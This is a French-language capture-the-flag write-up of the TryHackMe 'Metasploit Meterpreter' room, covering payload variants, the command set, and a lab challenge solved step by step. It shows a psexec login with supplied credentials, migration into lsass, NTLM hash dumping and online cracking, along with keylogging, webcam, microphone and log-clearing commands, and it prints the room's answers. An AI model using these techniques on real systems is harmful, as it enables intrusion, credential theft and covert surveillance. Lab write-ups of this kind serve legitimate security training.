---
title: "TryHackMe - Metasploit Meterpreter"
date: 2025-10-18 00:27:00 +0200
categories: [TryHackMe, Learning, Metasploit]
tags: [reverse-shell, exploitation, msfconsole, meterpreter, enumeration]
description: "Write-up de la room Metasploit Meterpreter - Approfondir nos connaissances sur le Framework Metasploit (Partie 3 sur 3)"
image:
  path: /assets/img/posts/tryhackme-metasploit-exploitation.png
  alt: "Metasploit Meterpreter"
---

## Informations sur la room

Cette room propose une introduction approfondie à Meterpreter, le payload avancé de Metasploit permettant la post-exploitation des systèmes compromis. C'est la troisième et dernière partie de la série Metasploit.

**Lien :** [Metasploit Meterpreter](https://tryhackme.com/room/meterpreter)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Comprendre le fonctionnement de Meterpreter
- Maîtriser les commandes intégrées de Meterpreter
- Effectuer de la post-exploitation avec Meterpreter
- Utiliser les différentes variantes de Meterpreter selon les systèmes cibles

---

## Solutions des tâches

### Task 1 - Introduction to Meterpreter

#### Qu'est-ce que Meterpreter ?

Meterpreter est un payload avancé de Metasploit qui fonctionne comme un agent d'infiltration sur le système compromis. Il offre une interface de commande interactive et un contrôle complet sur l'architecture cible.

**Caractéristiques principales :**

- **Exécution en mémoire** : Meterpreter s'exécute directement dans la RAM (Random Access Memory) plutôt que sur le disque
- **Furtivité** : Cette caractéristique permet d'éviter la détection par de nombreux antivirus qui scannent principalement les nouveaux fichiers sur le disque
- **Flexibilité** : Interface de commande complète pour la post-exploitation

> Bien que Meterpreter soit conçu pour éviter la détection en s'exécutant en mémoire, la plupart des solutions antivirus modernes se sont adaptées et peuvent désormais détecter ce type de payload.
{: .prompt-warning }

---

### Task 2 - Meterpreter Flavors

#### Les différentes versions de Meterpreter

Meterpreter existe en plusieurs variantes adaptées à différents systèmes et environnements. Pour lister tous les payloads Meterpreter disponibles :

```bash
msfvenom --list payloads | grep meterpreter
```

**Résultat partiel :**

```
android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection
linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker
```

#### Critères de sélection

Le choix de la version de Meterpreter appropriée repose sur trois critères principaux :

**1. Le système d'exploitation cible**
   - Windows, Linux, macOS, Android, iOS, etc.

**2. Les composants installés sur la machine**
   - Présence de PHP, Python, Java
   - Services web disponibles
   - Frameworks installés

**3. Les types de connexion autorisés**
   - TCP uniquement
   - HTTP/HTTPS disponibles
   - Restrictions firewall

> Le choix d'un payload adapté est crucial pour maximiser les chances de réussite de l'exploitation et maintenir la persistance sur le système cible.
{: .prompt-tip }

---

### Task 3 - Meterpreter Commands

#### Menu d'aide

Pour afficher toutes les commandes disponibles dans Meterpreter :

```bash
meterpreter > help
```

**Résultat :**

```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
```

> Chaque version de Meterpreter possède son propre menu d'aide avec des commandes spécifiques. Consultez toujours le `help` avant d'effectuer des actions sur un nouveau système.
{: .prompt-info }

#### Catégories d'outils Meterpreter

Meterpreter propose trois grandes catégories d'outils :

1. **Commandes intégrées** (Built-in commands)
2. **Outils Meterpreter**
3. **Scripts Meterpreter**

---

#### Commandes principales (Core Commands)

```
background    Passe la session Meterpreter actuelle en arrière-plan
exit          Termine la session Meterpreter
guid          Affiche l'identifiant global unique (GUID) de la session
help          Affiche le menu d'aide
info          Affiche les informations sur un module Post
irb           Ouvre un shell Ruby interactif sur la session actuelle
load          Charge une ou plusieurs extensions Meterpreter
migrate       Permet de migrer Meterpreter vers un autre processus
run           Exécute un script Meterpreter ou un module Post
sessions      Permet de basculer rapidement entre les sessions
```

---

#### Commandes de système de fichiers (File System Commands)

```
cd            Change le répertoire courant
ls            Liste les fichiers du répertoire courant (dir fonctionne aussi)
pwd           Affiche le répertoire de travail actuel
edit          Permet d'éditer un fichier
cat           Affiche le contenu d'un fichier à l'écran
rm            Supprime le fichier spécifié
search        Recherche des fichiers
upload        Téléverse un fichier ou un répertoire
download      Télécharge un fichier ou un répertoire
```

---

#### Commandes réseau (Networking Commands)

```
arp           Affiche le cache ARP (Address Resolution Protocol) de l'hôte
ifconfig      Affiche les interfaces réseau disponibles sur le système cible
netstat       Affiche les connexions réseau actives
portfwd       Transfère un port local vers un service distant
route         Permet de visualiser et modifier la table de routage
```

---

#### Commandes système (System Commands)

```
clearev       Efface les journaux d'événements
execute       Exécute une commande
getpid        Affiche l'identifiant du processus actuel
getuid        Affiche l'utilisateur sous lequel Meterpreter s'exécute
kill          Termine un processus
pkill         Termine des processus par nom
ps            Liste les processus en cours d'exécution
reboot        Redémarre l'ordinateur distant
shell         Ouvre un shell de commande système
shutdown      Éteint l'ordinateur distant
sysinfo       Obtient des informations sur le système distant (OS, architecture, etc.)
```

---

#### Autres commandes utiles

**Surveillance et capture :**
```
idletime         Retourne le nombre de secondes d'inactivité de l'utilisateur distant
keyscan_dump     Vide le buffer des frappes clavier capturées
keyscan_start    Commence la capture des frappes clavier
keyscan_stop     Arrête la capture des frappes clavier
screenshare      Permet de visualiser le bureau de l'utilisateur distant en temps réel
screenshot       Capture une capture d'écran du bureau interactif
record_mic       Enregistre l'audio du microphone par défaut pendant X secondes
```

**Webcam :**
```
webcam_chat      Démarre un chat vidéo
webcam_list      Liste les webcams disponibles
webcam_snap      Prend un instantané depuis la webcam spécifiée
webcam_stream    Lit un flux vidéo depuis la webcam spécifiée
```

**Élévation de privilèges :**
```
getsystem        Tente d'élever vos privilèges à celui du système local
hashdump         Vide le contenu de la base de données SAM (hashes des mots de passe)
```

---

### Task 4 - Post-Exploitation with Meterpreter

#### Commandes essentielles de post-exploitation

**Identifier l'utilisateur actuel**

La commande `getuid` affiche l'utilisateur sous lequel Meterpreter s'exécute actuellement :

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Si vous voyez `NT AUTHORITY\SYSTEM`, cela signifie que vous disposez des privilèges système les plus élevés sur Windows.
{: .prompt-tip }

**Lister les processus**

La commande `ps` affiche tous les processus en cours d'exécution :

```bash
meterpreter > ps
```

**Extraire les hashes des mots de passe**

La commande `hashdump` permet d'extraire les hashes NTLM des utilisateurs locaux :

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
```

**Rechercher des fichiers**

La commande `search` permet de localiser des fichiers spécifiques :

```bash
meterpreter > search -f flag2.txt
```

**Obtenir un shell système**

La commande `shell` lance un shell de commande standard du système :

```bash
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

---

### Task 5 - Post-Exploitation Challenge

#### Introduction au challenge

Ce challenge pratique met en œuvre les commandes apprises précédemment. Nous utiliserons notamment :

- `getsystem` pour l'élévation de privilèges
- `hashdump` pour l'extraction de hashes
- `load` pour charger des extensions supplémentaires

**Exemple de chargement d'extension :**

```bash
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!
```

#### Informations de connexion

**Credentials fournis pour la compromission initiale :**

- **Méthode** : Exploitation SMB avec `exploit/windows/smb/psexec`
- **Nom d'utilisateur** : `ballen`
- **Mot de passe** : `Password1`

---

#### Questions et résolutions

**Question 1 : What is the computer name?**

**Configuration de l'exploit :**

```bash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.19.109
msf6 exploit(windows/smb/psexec) > set SMBUser ballen
msf6 exploit(windows/smb/psexec) > set SMBPass Password1
msf6 exploit(windows/smb/psexec) > run
```

Une fois la session Meterpreter obtenue, j'ai utilisé la commande `sysinfo` pour obtenir les informations système :

```bash
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
```

**Réponse :** `ACME-TEST`

---

**Question 2 : What is the target domain?**

Cette information est également visible dans la sortie de la commande `sysinfo` ci-dessus.

**Réponse :** `FLASH`

---

**Question 3 : What is the name of the share likely created by the user?**

Pour énumérer les partages réseau, j'ai mis la session Meterpreter en arrière-plan et utilisé un module de post-exploitation :

```bash
meterpreter > background
msf6 > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate recently mapped shares
   SESSION                   yes       The session to run this module on
```

**Vérification des sessions actives :**

```bash
msf6 post(windows/gather/enum_shares) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TE  10.10.154.251:4444 -> 10.10.19.109:52648
                                     ST
```

**Exécution du module :**

```bash
msf6 post(windows/gather/enum_shares) > set SESSION 1
msf6 post(windows/gather/enum_shares) > run

[*] Running module against ACME-TEST (10.10.19.109)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed
```

Le partage "speedster" se distingue car il n'est pas un partage système standard.

**Réponse :** `speedster`

---

**Question 4 : What is the NTLM hash of the jchambers user?**

Pour extraire les hashes sans faire crasher la session, il est nécessaire de migrer vers le processus `lsass.exe` (Local Security Authority Subsystem Service).

**Étapes de migration :**

```bash
meterpreter > ps
# Identifier le PID du processus lsass.exe

meterpreter > migrate PID_LSASS
[*] Migrating from 1234 to 5678...
[*] Migration completed successfully.
```

**Extraction des hashes :**

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jchambers:1004:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
```

> La migration vers `lsass.exe` est cruciale car ce processus gère l'authentification et possède les hashes en mémoire.
{: .prompt-info }

**Réponse :** `69596c7aa1e8daee17f8e78870e25a5c`

---

**Question 5 : What is the cleartext password of the jchambers user?**

Pour déchiffrer le hash NTLM, j'ai utilisé le service en ligne [Hashes.com](https://hashes.com/en/decrypt/hash).

**Hash soumis :** `69596c7aa1e8daee17f8e78870e25a5c`

**Réponse :** `Trustno1`

---

**Question 6 : Where is the "secrets.txt" file located? (Full path of the file)**

Utilisation de la commande `search` pour localiser le fichier :

```bash
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                          Size (bytes)  Modified (UTC)
----                                                          ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  156       2021-07-15 14:23:18 +0100
```

**Réponse :** `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`

---

**Question 7 : What is the Twitter password revealed in the "secrets.txt" file?**

Lecture du contenu du fichier :

```bash
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

**Réponse :** `KDSvbsw3849!`

---

**Question 8 : Where is the "realsecret.txt" file located? (Full path of the file)**

Nouvelle recherche de fichier :

```bash
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                                Size (bytes)  Modified (UTC)
----                                ------------  --------------
c:\inetpub\wwwroot\realsecret.txt   45            2021-07-15 14:30:12 +0100
```

**Réponse :** `c:\inetpub\wwwroot\realsecret.txt`

---

**Question 9 : What is the real secret?**

Lecture du fichier final :

```bash
meterpreter > cat c:\inetpub\wwwroot\realsecret.txt
The Flash is the fastest man alive
```

**Réponse :** `The Flash is the fastest man alive`

---

**Room complétée**

{% include comments.html %}